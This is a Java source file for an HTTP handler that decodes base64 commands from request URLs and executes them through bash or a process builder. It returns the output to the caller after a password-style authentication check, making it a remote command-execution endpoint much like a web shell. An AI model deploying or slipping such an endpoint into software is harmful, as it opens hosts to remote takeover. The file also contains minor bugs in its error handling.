import java.io.*;
import java.util.*;
import java.net.*;
import java.awt.*;
import java.awt.image.*;
import java.nio.charset.*;
import java.awt.event.*;
import javax.swing.*;
import javax.imageio.*;
import com.sun.net.httpserver.*;


public class ShellHandler implements HttpHandler {
	@Override
	public void handle(HttpExchange he) throws IOException {
		String requestURI = (he.getRequestURI()).toString().substring(1);
		String authBody = (new String(he.getRequestBody().readAllBytes()));
		if(AuthService.isAuthentic(authBody)){
			String[] parts = requestURI.split("/");
			if(parts.length!=2){
				String response = "{\"status\":404, \"msg\":\"Command not recognized\"}";
				he.sendResponseHeaders(404, response.length());
				he.getResponseBody().write(response.getBytes(Charset.defaultCharset()));
			}else{
								Base64.Encoder enc = Base64.getEncoder();
				Base64.Decoder dec = Base64.getDecoder();
				final String command =  new String(dec.decode( java.net.URLDecoder.decode(parts[1], StandardCharsets.UTF_8.name()) ));;
				if(System.getProperty("os.name").startsWith("Linux")){
				try{
            		new Thread(new Runnable(){
						@Override
						public void run(){
							try{
							Process process = new ProcessBuilder(new String[]{"bash", "-c", command}).redirectErrorStream(true).start();
            				String output = "";
            				BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
			            	String line = null;
            				while ( (line = br.readLine()) != null )
                				output += line  + " <br> ";
	            			if (0 != process.waitFor()){
				                BufferedReader bre = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        	    			    line = null;
				                while ( (line = br.readLine()) != null )
            				        output += (line) + " <br> ";
			        	    }
  			          		System.out.println("shell >> " + command);
            				System.out.println(output.replace(" <br> ", "\n"));
							output =  enc.encodeToString(output.getBytes());
							String response = "{\"status\":200, \"msg\":\"Success\", \"res\":\"" + output + "\"}";
							he.sendResponseHeaders(200, response.length());
							he.getResponseBody().write(response.getBytes(Charset.defaultCharset()));
							}catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}).start();
				}catch (Exception ex) {
					ex.printStackTrace();
				}
        		}else{
            		try{
            		new Thread(new Runnable(){
						@Override
						public void run(){
							try{
							Process process = new ProcessBuilder((command).strip().trim().split(" ")).redirectErrorStream(true).start();
            				String output = "";
            				BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
			            	String line = null;
            				while ( (line = br.readLine()) != null )
                				output += line  + " <br> ";
	            			if (0 != process.waitFor()){
				                BufferedReader bre = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        	    			    line = null;
				                while ( (line = br.readLine()) != null )
            				        output += (line) + " <br> ";
			        	    }
  			          		System.out.println("shell >> " + command);
            				System.out.println(output.replace(" <br> ", "\n"));
							output =  enc.encodeToString(output.getBytes());
							String response = "{\"status\":200, \"msg\":\"Success\", \"res\":\"" + output + "\"}";
							he.sendResponseHeaders(200, response.length());
							he.getResponseBody().write(response.getBytes(Charset.defaultCharset()));
							}catch (Exception ex) {
								ex.printStackTrace();
							}
						}
					}).start();
				}catch (Exception ex) {
					ex.printStackTrace();
				}
        		}
			}
		}
		else{
			String response = "{\"status\":403, \"msg\":\"Authentication Failed\"}";
			he.sendResponseHeaders(403, response.length());
			he.getResponseBody().write(response.getBytes(Charset.defaultCharset()));
		}
	}
}

